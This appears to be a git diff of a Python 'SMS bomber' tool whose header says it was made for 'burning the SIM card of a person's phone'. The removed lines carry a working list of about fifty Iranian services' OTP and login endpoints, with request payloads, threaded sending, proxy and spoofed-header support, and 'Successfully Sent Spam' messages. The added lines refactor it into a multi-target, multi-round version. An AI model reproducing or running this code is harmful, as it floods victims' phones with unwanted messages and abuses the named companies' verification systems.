@@ -1,14 +1,15 @@
-'''
+# -*- coding: utf-8 -*-
+
 ######################################################################################
 # About :                                                                            #
 #                                                                                    #
 # Description: This Program Powered By Charon Security Agency                        #
 # Made for: Fun and burning the SIM card of a person's phone                         #
-# Programmer: Ch4120n                                                                #
+# Programmer: AmirHossein Ghanami (Ch4120N)                                          #
 #                                                                                    #
 # Copyright :                                                                        #
 #                                                                                    #
-# Charon SMS Bomber (C) <2024> <Charon Security Agency>                              #
+# Charon SMS Bomber (C) <2025> <Charon Security Agency>                              #
 # This Program Is Free Software: You Can Redistribute It                             #
 # It Under The Terms Of The  `Charon General Black License`  As Published By         #
 # The Black Hacking Software Foundation , Either Version 1 Of The License.           #
@@ -19,871 +20,390 @@
 # Along With This Program. If Not, See <http://charonsecurityagency.github.io/cgbl>  #
 #                                                                                    #
 ######################################################################################
-'''
 
-
-import requests
-import random
-import time
 import os
-import subprocess
-import shutil
-import platform
-# import json
-# import re
+import signal
+import json
 import sys
-# import signal
-import argparse
-import concurrent.futures
-from threading import Thread
-from pystyle import Colors, Colorate
-from datetime import datetime
+import requests
+import time
+import webbrowser
+import concurrent.futures as confutures
+from Core.Config import *
+from Core.Functions import colorizeInput
+from Core.Banner import Banner, Menu
+from Core.Api import API_LIST, API_VERSION, API_LIST_COUNT
+from Core.Log import Logs
 from fake_useragent import UserAgent
-from stem import Signal
-from stem.control import Controller
-from alive_progress import alive_bar
-from fake_headers import Headers
-from colorama import Fore, init, Style
-init()
+
+# Generate random User-Agent headers to make requests look less predictable
+ua = UserAgent()
 
 
+class ChSMSBomber:
+    """
+    ChSMSBomber - A multi-threaded SMS Bomber tool for educational/research use.
 
+    Features:
+    - Multi-target: Allows bombing multiple phone numbers at once.
+    - Threading: Uses ThreadPoolExecutor for concurrent API requests.
+    - Round-based: Can send multiple attack "rounds".
+    - Config persistence: Saves attack parameters to continue.json for resuming.
+    - Update checker: Automatically checks for new versions from GitHub.
+    """
 
-
-class Logs:
-    # def __init__(self) -> None:
-    @classmethod
-    def gettime(self):
-        return str(datetime.now().strftime("%H:%M:%S"))
-    # def __init__(self):
-    #     
-    # self.
-    @classmethod
-    def success(self, text):
-        
-        return f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}{Logs.gettime()}{Fore.LIGHTBLUE_EX}] [{Fore.LIGHTGREEN_EX}SUCCESS{Fore.LIGHTBLUE_EX}] {Fore.RESET}{text}"
-	
-    # @classmethod
-    # def warning(self,text):
-    #     print(Fore.LIGHTBLUE_EX+"["+Fore.LIGHTYELLOW_EX+datetime.now().strftime("%H:%M:%S")+Fore.LIGHTBLUE_EX+"] ["+Fore.LIGHTYELLOW_EX+"WARNING"+Fore.LIGHTBLUE_EX+"] "+Fore.RESET+text)
-
-    @classmethod
-    def failed(self,text):
-        return f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}{Fore.LIGHTYELLOW_EX}{Logs.gettime()}{Fore.LIGHTBLUE_EX}] [{Fore.LIGHTRED_EX}FAILED{Fore.LIGHTBLUE_EX}] {Fore.RESET}{text}"
-
-class CusHelpFormatter(argparse.HelpFormatter):
-    """A custom HelpFormatter class that capitalizes the first letter of usage text."""
-    def add_usage(self, usage, actions, groups, prefix=None):
-        """Add usage method to display the usage text with the first letter capitalized."""
-        if prefix is None:
-            prefix = ''
-        return super(CusHelpFormatter, self).add_usage(
-            usage, actions, groups, prefix)
-
-
-class CharonSMSBomber:
-    headers = Headers()
-    requests_codes = {
-        403 : 'Forbidden',
-        429 : 'Too Many Requests',
-        500 : 'Internal Server Error',
-        400 : 'Bad Request',
-        423 : 'Locked',
-        412 : 'Precondition Failed',
-        404 : 'Not Found',
-        406 : 'Not Acceptable',
-        402 : 'Payment Required',
-        405 : 'Method Not Allowed',
-        200 : Fore.LIGHTGREEN_EX+'OK',
-        201 : Fore.LIGHTGREEN_EX+'Created',
-        401 : 'Unauthorized',
-        407 : 'Proxy Authentication Required',
-        408 : 'Request Timeout',
-        451 : 'Unavailable For Legal Reasons',
-        501 : 'Not Implemented',
-        502 : 'Bad Gateway'
-        
-    }
     def __init__(self):
-        self.is_termux()
-        # signal.signal(signal.SIGINT, self.sigint_handler)
-        parser = argparse.ArgumentParser(add_help=False, usage=self.Usage(), exit_on_error=False,formatter_class=CusHelpFormatter)
-        parser.add_argument(
-            'TargetPhone',
-            help='Specify the target phone number'
-            )
-        parser.add_argument(
-            "-t",
-            "--times",
-            help="Specify the number of bombing times, default is 7",
-            type=int,
-            default=7,
-            )
-        parser.add_argument(
-            "-p",
-            "--process",
-            help="Specify the number of processes, default is 5",
-            type=int,
-            default=5,
-            )
-        
-        parser.add_argument(
-            "-x",
-            "--proxy",
-            help="Set the proxy for requests (http/https/socks)"
-            )
-        parser.error = lambda message: print(self.Usage()) or sys.exit(2)
-        args = parser.parse_args()
-        phone_number = args.TargetPhone
-        bombing_times = args.times
-        process_num = args.process
-        proxy = args.proxy
-        
-        if proxy:
-            print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] {Fore.LIGHTRED_EX} Using Proxy: {proxy}")
-            proxy_dict = {"http": proxy, "https": proxy}
-        else:
-            proxy_dict = None
-        
-        self.apis = [
-            {
-                "name": "Snapp V1",
-                "url": "https://api.snapp.ir/api/v1/sms/link",
-                "data": {"phone": phone_number},
-            },
-            {
-                "name": "Snapp V2",
-                "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={phone_number}",
-                "data": {"cellphone": phone_number},
-            },
-            {
-                'name' : "DoctorNext",
-                'url'  : "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
-                'data' : {"source":"besina","mobile":phone_number,"key":"U2FsdGVkX197qqA2kXzD+GTu4qn/QCW1oYnbXhiK0qK1TRMg2YK09y1m/VBTqQ33QuYbBsUqHz3Q4BTANrnNgA=="}
-            },
-            {
-                'name' : 'Tapsi',
-                'url'  : 'https://api.tapsi.cab/api/v2.2/user',
-                'data' : {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"},"otpOption":"SMS"}
-            },
-            {
-                'name' : 'Snapp V3',
-                'url'  : 'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass',
-                'data' : f'cellphone={phone_number}&platform=PWA'
-            },
-            {
-              'name' : 'Behtarino',
-              'url' : 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/',
-              'data':   {"phone":phone_number}
-            },
-            {
-                'name' : 'drdr',
-                'url' : 'https://drdr.ir/api/v3/auth/login/mobile/init',
-                'data' : {"mobile":phone_number}  
-            },
-            {
-                'name' : 'Okala',
-                'url' : 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister',
-                'data' : {"mobile":phone_number,"confirmTerms":'true',"notRobot":'false'}
-            },
-            {
-                'name' : 'Mrbilit',
-                'url' : 'https://auth.mrbilit.ir/api/login/exists/v2'  ,
-                'data' : f'mobileOrEmail={phone_number}&source=2&sendTokenIfNot=true'
-            },
-            {
-                'name' : 'footbal360',
-                'url' : 'https://football360.ir/api/auth/v2/send_otp/',
-                'data' : {"phone_number":phone_number,"otp_token":"JZnul6S6Fl7bfFr6yFcziftf","auto_read_platform":"ST"}  
-            },
-            {
-                "name": "Achareh",
-                "url": "https://api.achareh.co/v2/accounts/login/",
-                "data": {"phone": f"98{phone_number[1:]}"},
-            },
-            {
-                "name": "Zigap",
-                "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
-                "data": {"phoneNumber": f"+98{phone_number[1:]}"},
-            },
-            {
-                "name": "Jabama",
-                "url": "https://gw.jabama.com/api/v4/account/send-code",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Banimode",
-                "url": "https://mobapi.banimode.com/api/v2/auth/request",
-                "data": {"phone": phone_number},
-            },
-            {
-                "name": "Classino",
-                "url": "https://student.classino.com/otp/v1/api/login",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Digikala V1",
-                "url": "https://api.digikala.com/v1/user/authenticate/",
-                "data": {"username": phone_number, "otp_call": False},
-            },
-            {
-                "name": "Digikala V2",
-                "url": "https://api.digikala.com/v1/user/forgot/check/",
-                "data": {"username": phone_number},
-            },
-            {
-                "name": "Sms.ir",
-                "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
-                "data": phone_number,
-            },
-            {
-                "name": "Alibaba",
-                "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
-                "data": {"phoneNumber": phone_number[1:]},
-            },
-            {
-                "name": "Divar",
-                "url": "https://api.divar.ir/v5/auth/authenticate",
-                "data": {"phone": phone_number},
-            },
-            {
-                "name": "Sheypoor",
-                "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
-                "data": {"username": phone_number},
-            },
-            {
-                "name": "Bikoplus",
-                "url": "https://bikoplus.com/account/check-phone-number",
-                "data": {"phoneNumber": phone_number},
-            },
-            {
-                "name": "Mootanroo",
-                "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
-                "data": {"PhoneNumber": phone_number},
-            },
-            {
-                "name": "Tap33",
-                "url": "https://tap33.me/api/v2/user",
-                "data": {"credential": {"phoneNumber": phone_number, "role": "BIKER"}},
-            },
-            {
-                "name": "Tapsi",
-                "url": "https://api.tapsi.ir/api/v2.2/user",
-                "data": {
-                    "credential": {"phoneNumber": phone_number, "role": "DRIVER"},
-                    "otpOption": "SMS",
-                },
-            },
-            {
-                "name": "GapFilm",
-                "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
-                "data": {"Type": "3", "Username": phone_number[1:]},
-            },
-            {
-                "name": "IToll",
-                "url": "https://app.itoll.com/api/v1/auth/login",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Anargift",
-                "url": "https://api.anargift.com/api/v1/auth/auth",
-                "data": {"mobile_number": phone_number},
-            },
-            {
-                "name": "Nobat",
-                "url": "https://nobat.ir/api/public/patient/login/phone",
-                "data": {"mobile": phone_number[1:]},
-            },
-            {
-                "name": "Lendo",
-                "url": "https://api.lendo.ir/api/customer/auth/send-otp",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Hamrah-Mechanic",
-                "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
-                "data": {"PhoneNumber": phone_number},
-            },
-            {
-                "name": "Abantether",
-                "url": "https://abantether.com/users/register/phone/send/",
-                "data": {"phoneNumber": phone_number},
-            },
-            {
-                "name": "OKCS",
-                "url": "https://my.okcs.com/api/check-mobile",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Tebinja",
-                "url": "https://www.tebinja.com/api/v1/users",
-                "data": {"username": phone_number},
-            },
-            {
-                "name": "Bit24",
-                "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Rojashop",
-                "url": "https://rojashop.com/api/send-otp-register",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Paklean",
-                "url": "https://client.api.paklean.com/download",
-                "data": {"tel": phone_number},
-            },
-            {
-                "name": "Khodro45",
-                "url": "https://khodro45.com/api/v1/customers/otp/",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Delino",
-                "url": "https://www.delino.com/user/register",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "DigikalaJet",
-                "url": "https://api.digikalajet.ir/user/login-register/",
-                "data": {"phone": phone_number},
-            },
-            {
-                "name": "Miare",
-                "url": "https://www.miare.ir/api/otp/driver/request/",
-                "data": {"phone_number": phone_number},
-            },
-            {
-                "name": "Dosma",
-                "url": "https://app.dosma.ir/api/v1/account/send-otp/",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Ostadkr",
-                "url": "https://api.ostadkr.com/login",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Sibbazar",
-                "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
-                "data": {"username": phone_number},
-            },
-            {
-                "name": "Namava",
-                "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
-                "data": {"UserName": f"+98{phone_number[1:]}"},
-            },
-            {
-                "name": "Shab",
-                "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
-                "data": {"mobile": phone_number},
-            },
-            {
-                "name": "Bitpin",
-                "url": "https://api.bitpin.org/v2/usr/signin/",
-                "data": {"phone": phone_number},
-            },
-            {
-                "name": "Taaghche",
-                "url": "https://gw.taaghche.com/v4/site/auth/signup",
-                "data": {"contact": phone_number},
-            },
-            {
-                'name' : 'Torob',
-                'url'  : 'https://api.torob.com/a/phone/send-pin/',
-                'data' : f'phone_number={phone_number}'
-            }
-            # {
-            #     "name": "Digipay",
-            #     "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
-            #     "data": {"cellNumber": phone_number},
-            # }, # This one will send your IP to your target.
-        
-        ]
-        if platform.system().lower() == "windows":
-            pass
-        else:
-            self.dependencies()
+        # Default runtime configuration
+        self.REQUEST_TIMEOUT = 5        # Timeout for each request (seconds)
+        self.REQUEST_DELAY = 0.05       # Delay between requests (seconds)
+        self.targetPhoneNumber = []     # List of targets
+        self.numThreads = 0             # Number of concurrent threads
+        self.numRounds = 0              # Number of attack rounds
+        self.API_LIST = []              # API endpoints for SMS sending
 
-        self.run(bombing_times, process_num, proxy_dict)
-    
-    def is_termux(self):
-        if os.path.isdir("/data/data/com.termux/files/home"):
-            self.Menu()
-        return True
-    def Menu(self):
-        
+        # Attach signal handler for CTRL+C
+        signal.signal(signal.SIGINT, self.CTRL_C_SIGNAL)
+
+        # Show banner and check for updates
+        print(Banner.DefaultBanner())
+        self.check_update()
+
+        # Menu loop
         while True:
-            print(self.Horizontal(self.Logo())) 
-            try:
-                print(f"\n{Fore.LIGHTGREEN_EX}[{Fore.LIGHTYELLOW_EX}1{Fore.LIGHTGREEN_EX}] Charon SMS Bomber")
-                print(f"{Fore.LIGHTGREEN_EX}[{Fore.LIGHTYELLOW_EX}2{Fore.LIGHTGREEN_EX}] {Fore.LIGHTBLUE_EX}Developer")
-                print(f"{Fore.LIGHTGREEN_EX}[{Fore.LIGHTYELLOW_EX}3{Fore.LIGHTGREEN_EX}] {Fore.LIGHTRED_EX}Exit")
-                
-                choose = input(f'{Fore.LIGHTBLUE_EX}┌──({Fore.LIGHTGREEN_EX}Home{Fore.LIGHTBLUE_EX})-[{Fore.LIGHTWHITE_EX}~{Fore.LIGHTBLUE_EX}]\n└─{Fore.LIGHTRED_EX}# ')
-                if str(choose) == '1':
-                    self.Menu2()
-                if str(choose) == '2':
-                    print('''
-**********************
-Powered By [ Ch4120N ]
-Assistance With Charon Security Agency
-Version 1.0
-every month This Script Update                      
-                        ''')
-                    input('press to back menu ....')
-                if str(choose) == '3':
-                    sys.exit('Good By')
-                    
-            except KeyboardInterrupt:
-                sys.exit('Good By')
-    def Menu2(self):
-        print(self.Horizontal(self.Logo()))
-        try:
-            print('\n[+] Charon SMS Bomber : Please Fill All Prompts')
-            phone_number = input(f'{Fore.LIGHTBLUE_EX}┌──({Fore.LIGHTGREEN_EX}Charon SMS Bomber{Fore.LIGHTBLUE_EX})-[ {Fore.LIGHTWHITE_EX}Phone Number (without: +98 start with: 0){Fore.LIGHTBLUE_EX} ]\n└─{Fore.LIGHTRED_EX}# ')
-            bombing_times = input(f'{Fore.LIGHTBLUE_EX}┌──({Fore.LIGHTGREEN_EX}Charon SMS Bomber{Fore.LIGHTBLUE_EX})-[ {Fore.LIGHTWHITE_EX}Number Of Bombing Time (Default: 7){Fore.LIGHTBLUE_EX} ]\n└─{Fore.LIGHTRED_EX}# ')
-            process_num = input(f'{Fore.LIGHTBLUE_EX}┌──({Fore.LIGHTGREEN_EX}Charon SMS Bomber{Fore.LIGHTBLUE_EX})-[ {Fore.LIGHTWHITE_EX}Number Of Threads (Default: 5){Fore.LIGHTBLUE_EX} ]\n└─{Fore.LIGHTRED_EX}# ')
-            proxy = input(f'{Fore.LIGHTBLUE_EX}┌──({Fore.LIGHTGREEN_EX}Charon SMS Bomber{Fore.LIGHTBLUE_EX})-[{Fore.LIGHTWHITE_EX}Set The Proxy (Default: Nothing){Fore.LIGHTBLUE_EX}]\n└─{Fore.LIGHTRED_EX}# ')
-            
-            if proxy == "" or proxy == " " or proxy == None:
-                proxy_dict = None
+            print(Banner.DefaultBanner())
+
+            # If there’s a saved session, show "Continue" menu
+            if os.path.exists("continue.json"):
+                print(Menu.MainMenuContinue())
             else:
-                print(f"\n{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] {Fore.LIGHTRED_EX} Using Proxy: {proxy}")
-                proxy_dict = {"http": proxy, "https": proxy}
+                print(Menu.MainMenu())
 
-            if len(phone_number) > 11:
-                print("Please Enter Correct Phone Number")
-        
-            self.apis = [
-                {
-                    "name": "Snapp V1",
-                    "url": "https://api.snapp.ir/api/v1/sms/link",
-                    "data": {"phone": phone_number},
-                },
-                {
-                    "name": "Snapp V2",
-                    "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={phone_number}",
-                    "data": {"cellphone": phone_number},
-                },
-                {
-                    'name' : "DoctorNext",
-                    'url'  : "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
-                    'data' : {"source":"besina","mobile":phone_number,"key":"U2FsdGVkX197qqA2kXzD+GTu4qn/QCW1oYnbXhiK0qK1TRMg2YK09y1m/VBTqQ33QuYbBsUqHz3Q4BTANrnNgA=="}
-                },
-                {
-                    'name' : 'Tapsi',
-                    'url'  : 'https://api.tapsi.cab/api/v2.2/user',
-                    'data' : {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"},"otpOption":"SMS"}
-                },
-                {
-                    'name' : 'Snapp V3',
-                    'url'  : 'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass',
-                    'data' : f'cellphone={phone_number}&platform=PWA'
-                },
-                {
-                'name' : 'Behtarino',
-                'url' : 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/',
-                'data':   {"phone":phone_number}
-                },
-                {
-                    'name' : 'drdr',
-                    'url' : 'https://drdr.ir/api/v3/auth/login/mobile/init',
-                    'data' : {"mobile":phone_number}  
-                },
-                {
-                    'name' : 'Okala',
-                    'url' : 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister',
-                    'data' : {"mobile":phone_number,"confirmTerms":'true',"notRobot":'false'}
-                },
-                {
-                    'name' : 'Mrbilit',
-                    'url' : 'https://auth.mrbilit.ir/api/login/exists/v2'  ,
-                    'data' : f'mobileOrEmail={phone_number}&source=2&sendTokenIfNot=true'
-                },
-                {
-                    'name' : 'footbal360',
-                    'url' : 'https://football360.ir/api/auth/v2/send_otp/',
-                    'data' : {"phone_number":phone_number,"otp_token":"JZnul6S6Fl7bfFr6yFcziftf","auto_read_platform":"ST"}  
-                },
-                {
-                    "name": "Achareh",
-                    "url": "https://api.achareh.co/v2/accounts/login/",
-                    "data": {"phone": f"98{phone_number[1:]}"},
-                },
-                {
-                    "name": "Zigap",
-                    "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
-                    "data": {"phoneNumber": f"+98{phone_number[1:]}"},
-                },
-                {
-                    "name": "Jabama",
-                    "url": "https://gw.jabama.com/api/v4/account/send-code",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Banimode",
-                    "url": "https://mobapi.banimode.com/api/v2/auth/request",
-                    "data": {"phone": phone_number},
-                },
-                {
-                    "name": "Classino",
-                    "url": "https://student.classino.com/otp/v1/api/login",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Digikala V1",
-                    "url": "https://api.digikala.com/v1/user/authenticate/",
-                    "data": {"username": phone_number, "otp_call": False},
-                },
-                {
-                    "name": "Digikala V2",
-                    "url": "https://api.digikala.com/v1/user/forgot/check/",
-                    "data": {"username": phone_number},
-                },
-                {
-                    "name": "Sms.ir",
-                    "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code",
-                    "data": phone_number,
-                },
-                {
-                    "name": "Alibaba",
-                    "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
-                    "data": {"phoneNumber": phone_number[1:]},
-                },
-                {
-                    "name": "Divar",
-                    "url": "https://api.divar.ir/v5/auth/authenticate",
-                    "data": {"phone": phone_number},
-                },
-                {
-                    "name": "Sheypoor",
-                    "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
-                    "data": {"username": phone_number},
-                },
-                {
-                    "name": "Bikoplus",
-                    "url": "https://bikoplus.com/account/check-phone-number",
-                    "data": {"phoneNumber": phone_number},
-                },
-                {
-                    "name": "Mootanroo",
-                    "url": "https://api.mootanroo.com/api/v3/auth/send-otp",
-                    "data": {"PhoneNumber": phone_number},
-                },
-                {
-                    "name": "Tap33",
-                    "url": "https://tap33.me/api/v2/user",
-                    "data": {"credential": {"phoneNumber": phone_number, "role": "BIKER"}},
-                },
-                {
-                    "name": "Tapsi",
-                    "url": "https://api.tapsi.ir/api/v2.2/user",
-                    "data": {
-                        "credential": {"phoneNumber": phone_number, "role": "DRIVER"},
-                        "otpOption": "SMS",
-                    },
-                },
-                {
-                    "name": "GapFilm",
-                    "url": "https://core.gapfilm.ir/api/v3.1/Account/Login",
-                    "data": {"Type": "3", "Username": phone_number[1:]},
-                },
-                {
-                    "name": "IToll",
-                    "url": "https://app.itoll.com/api/v1/auth/login",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Anargift",
-                    "url": "https://api.anargift.com/api/v1/auth/auth",
-                    "data": {"mobile_number": phone_number},
-                },
-                {
-                    "name": "Nobat",
-                    "url": "https://nobat.ir/api/public/patient/login/phone",
-                    "data": {"mobile": phone_number[1:]},
-                },
-                {
-                    "name": "Lendo",
-                    "url": "https://api.lendo.ir/api/customer/auth/send-otp",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Hamrah-Mechanic",
-                    "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
-                    "data": {"PhoneNumber": phone_number},
-                },
-                {
-                    "name": "Abantether",
-                    "url": "https://abantether.com/users/register/phone/send/",
-                    "data": {"phoneNumber": phone_number},
-                },
-                {
-                    "name": "OKCS",
-                    "url": "https://my.okcs.com/api/check-mobile",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Tebinja",
-                    "url": "https://www.tebinja.com/api/v1/users",
-                    "data": {"username": phone_number},
-                },
-                {
-                    "name": "Bit24",
-                    "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Rojashop",
-                    "url": "https://rojashop.com/api/send-otp-register",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Paklean",
-                    "url": "https://client.api.paklean.com/download",
-                    "data": {"tel": phone_number},
-                },
-                {
-                    "name": "Khodro45",
-                    "url": "https://khodro45.com/api/v1/customers/otp/",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Delino",
-                    "url": "https://www.delino.com/user/register",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "DigikalaJet",
-                    "url": "https://api.digikalajet.ir/user/login-register/",
-                    "data": {"phone": phone_number},
-                },
-                {
-                    "name": "Miare",
-                    "url": "https://www.miare.ir/api/otp/driver/request/",
-                    "data": {"phone_number": phone_number},
-                },
-                {
-                    "name": "Dosma",
-                    "url": "https://app.dosma.ir/api/v1/account/send-otp/",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Ostadkr",
-                    "url": "https://api.ostadkr.com/login",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Sibbazar",
-                    "url": "https://sandbox.sibbazar.com/api/v1/user/invite",
-                    "data": {"username": phone_number},
-                },
-                {
-                    "name": "Namava",
-                    "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
-                    "data": {"UserName": f"+98{phone_number[1:]}"},
-                },
-                {
-                    "name": "Shab",
-                    "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile",
-                    "data": {"mobile": phone_number},
-                },
-                {
-                    "name": "Bitpin",
-                    "url": "https://api.bitpin.org/v2/usr/signin/",
-                    "data": {"phone": phone_number},
-                },
-                {
-                    "name": "Taaghche",
-                    "url": "https://gw.taaghche.com/v4/site/auth/signup",
-                    "data": {"contact": phone_number},
-                },
-                {
-                    'name' : 'Torob',
-                    'url'  : 'https://api.torob.com/a/phone/send-pin/',
-                    'data' : f'phone_number={phone_number}'
-                }
-                # {
-                #     "name": "Digipay",
-                #     "url": "https://www.mydigipay.com/digipay/api/users/send-sms",
-                #     "data": {"cellNumber": phone_number},
-                # }, # This one will send your IP to your target.
-            
-            ]
-            self.run(int(bombing_times), int(process_num), proxy_dict)
-            input('press to back menu ....')
-        except KeyboardInterrupt:
-            sys.exit('Good By')
+            try:
+                mainMenuInputChoose = int(colorizeInput(INPUT_HOME))
 
-    def dependencies(self):
-        print("\n{}[{}+{}]{} Installing required packages...".format(Fore.GREEN, Fore.WHITE, Fore.GREEN, Fore.CYAN))
+                if mainMenuInputChoose == 1:
+                    self.startMain()  # Start new bombing session
+                elif mainMenuInputChoose == 2:
+                    self.continueMain()  # Continue from saved configuration
+                elif mainMenuInputChoose == 3:
+                    webbrowser.open("https://github.com/Ch4120N/Charon-SMS-Bomber")
+                elif mainMenuInputChoose == 4:
+                    self.aboutMain()  # Display about info
+                elif mainMenuInputChoose == 5:
+                    # Exit cleanly
+                    print("\r" + Logs.error("Program Interrupted By User!"), flush=True)
+                    os.kill(os.getpid(), signal.SIGTERM)
+            except ValueError:
+                print(Logs.error("Invalid Value. Please Insert Number (e.g, 1)"))
+                colorizeInput(INPUT_BACKMENU)
 
-        # if os.path.isdir("/data/data/com.termux/files/home"):
-            # if not shutil.which("proot"):
-            #     print("\n{}[{}+{}]{} Installing package : {}proot{}".format(Fore.GREEN, Fore.WHITE, Fore.GREEN, Fore.CYAN, Fore.LIGHTYELLOW_EX, Fore.CYAN, Fore.WHITE))
-            #     subprocess.run(["pkg", "install", "tor", "resolv-conf", "python","git", "-y"])
+    def CTRL_C_SIGNAL(self, frm, func):
+        """
+        Graceful shutdown when user presses CTRL+C.
+        """
+        print("\n\n", "\r" + Logs.error("Program Interrupted!"), flush=True)
+        os.kill(os.getpid(), signal.SIGTERM)
 
-            # if not shutil.which("tput"):
-            #     print("\n{}[{}+{}]{} Installing package : {}ncurses-utils{}".format(Fore.GREEN, Fore.WHITE, Fore.GREEN, Fore.CYAN, Fore.LIGHTYELLOW_EX, Fore.CYAN, Fore.WHITE))
-            #     subprocess.run(["pkg", "install", "ncurses-utils", "-y"])
+    def check_update(self):
+        """
+        Compare local VERSION with the GitHub version file.
+        Terminates if update is available.
+        """
+        print(Logs.fetchMessage("Checking for updates ..."))
+        fver = requests.get(
+            "https://raw.githubusercontent.com/Ch4120N/Charon-SMS-Bomber/master/version"
+        ).text.strip()
 
-        if all(shutil.which(cmd) for cmd in ["php", "curl", "unzip"]):
-            print("\n{}[{}+{}]{} Packages already installed.".format(Fore.GREEN, Fore.WHITE, Fore.GREEN, Fore.GREEN))
-        else:
-            pkgs = ["tor", "python", "git"]
-            for pkg in pkgs:
-                if not shutil.which(pkg):
-                    print("\n{}[{}+{}]{} Installing package : {}{}{}".format(Fore.GREEN, Fore.WHITE, Fore.GREEN, Fore.CYAN, Fore.LIGHTYELLOW_EX, pkg, Fore.CYAN, Fore.WHITE))
-                    if shutil.which("pkg"):
-                        subprocess.run(["pkg", "install", pkg, "-y"])
-                    elif shutil.which("apt"):
-                        subprocess.run(["sudo", "apt", "install", pkg, "-y"])
-                    elif shutil.which("apt-get"):
-                        subprocess.run(["sudo", "apt-get", "install", pkg, "-y"])
-                    elif shutil.which("pacman"):
-                        subprocess.run(["sudo", "pacman", "-S", pkg, "--noconfirm"])
-            
-                    elif shutil.which("dnf"):
-                        subprocess.run(["sudo", "dnf", "-y", "install", pkg])
-                    elif shutil.which("yum"):
-                        subprocess.run(["sudo", "yum", "-y", "install", pkg])
-                    else:
-                        print("\n{}[{}!{}]{} Unsupported package manager, Install packages manually.".format(Fore.RED, Fore.WHITE, Fore.RED, Fore.RED))
-                        # reset_color()
-                        exit(1)
-
-# dependencies()
-    def Horizontal(self, logo=None):
-        return Colorate.Horizontal(Colors.rainbow, logo)
-    def send_request(self, api_name, api_url, data, timeout, proxy=None):
-        generated_headers = self.headers.generate()
-        # current_time = datetime.now().strftime("%H:%M:%S")
-
-        try:
-            self.response = requests.post(
-                api_url,
-                headers=generated_headers,
-                json=data,
-                timeout=timeout,
-                proxies=proxy,
-            )
-            self.response.raise_for_status()
-            return Logs.success(f"{Fore.LIGHTYELLOW_EX}{api_name} {Fore.LIGHTWHITE_EX}=> {Fore.LIGHTGREEN_EX}Successfully Sent Spam")
-            # return f"{Fore.YELLOW}[{current_time}] {Fore.GREEN}[+] {api_name}:{Style.RESET_ALL} OK"
-        except requests.exceptions.RequestException:
-            # print(e)
-            # print(str(error).split(':'))
-            # return f"{Fore.YELLOW}[{current_time}] {Fore.RED}[-] {api_name}:{Style.RESET_ALL} Failed - {e}"
-            error = self.requests_codes.get(self.response.status_code)
-            return Logs.failed(f"{Fore.LIGHTYELLOW_EX}{api_name} {Fore.LIGHTWHITE_EX}=> {Fore.LIGHTRED_EX}Failed To Send Spam {Fore.LIGHTWHITE_EX}=> {Fore.LIGHTRED_EX}{self.response.status_code} : {error}")
-    
-    def process_target(self, api, proxy):
-        return self.send_request(api["name"], api["url"], api["data"], timeout=5, proxy=proxy)
-    
